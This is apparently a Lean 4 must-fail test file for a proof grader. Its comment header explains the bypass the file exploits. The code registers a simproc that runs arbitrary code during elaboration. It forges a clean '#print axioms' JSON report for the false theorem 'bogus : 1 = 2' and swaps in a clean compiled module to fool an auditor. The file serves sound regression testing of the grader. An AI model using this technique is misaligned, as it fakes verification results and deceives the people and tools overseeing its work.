/-
TOOLCHECK MF21 — MUST-FAIL control (Red Team r4 T88 on PR #824): an INDENTED
`simproc_pattern%` registers a PLAIN `def` Simproc, fired by `simp only [go]`. Rule H of
`5b4792e` kept only word-like command heads, so `simproc_pattern%` (a non-word head) passed
the subset, and the user code ran.

What `go` does. In the `--json` run it forges a clean report for `bogus` at its
`#print axioms` site on `/dev/stdout` and exits 0. In the FRESH COMPILE (`lean -o PATH`, read
from its own `/proc/self/cmdline`) it compiles a CLEAN module of the same name to PATH in a
child `lean` and exits 0. The PR #829 auditor then audits that substituted `.olean` and reports
it clean, so the structural verdict is forged too (#829's stated limit S1, QBP#836: the compile
is not sandboxed). `bogus : (1 : Nat) = 2` is false and is never elaborated.

So the pass-file SUBSET is the PRECONDITION for the structural verdict, not defense in depth:
rule H must refuse every non-allowlisted command head, including the non-word ones.
`selftest_grader.py` replays this file as a pass-labelled attack (the `5b4792e` grader PASSES it),
and also with every subset rule off, where the structural audit alone is EXPECTED to be fooled
(it documents S1).

TOOLCHECK-EXPECT: lean-ok
TOOLCHECK-EXPECT: subset-refused
-/
import Lean
open Lean Meta Simp

namespace QBPToolcheck.MF21

def go : Simproc := fun _ => do
  let raw ← IO.FS.readBinFile "/proc/self/cmdline"
  let args := (String.fromUTF8! raw).splitOn "\x00"
  match args.dropWhile (· != "-o") with
  | _ :: out :: _ =>
    let o : System.FilePath := out
    let stem := o.fileStem.getD "X"
    let aud := ((o.parent.getD ".").parent.getD ".").parent.getD "."
    let root := aud / "forge-src"
    IO.FS.createDirAll (root / "ToolcheckAudit")
    let src := root / "ToolcheckAudit" / (stem ++ ".lean")
    IO.FS.writeFile src "theorem QBPToolcheck.MF21.bogus : (1 : Nat) = 1 := rfl\n"
    let _ ← IO.Process.output { cmd := "lean", args := #["-R", root.toString, "-o", out, src.toString] }
    IO.Process.exit 0
  | _ =>
    let h ← IO.FS.Handle.mk "/dev/stdout" .append
    h.putStrLn (String.ofList (List.replicate 8000 ' '))
    h.putStrLn "\x7B\"severity\":\"information\",\"pos\":\x7B\"line\":57,\"column\":0\x7D,\"data\":\"'QBPToolcheck.MF21.bogus' does not depend on any axioms\"\x7D"
    h.flush
    IO.Process.exit 0

  simproc_pattern% Nat.succ _ => QBPToolcheck.MF21.go

theorem trig : Nat.succ 0 = 1 := by simp only [go]

theorem bogus : (1 : Nat) = 2 := rfl

end QBPToolcheck.MF21

#print axioms QBPToolcheck.MF21.bogus
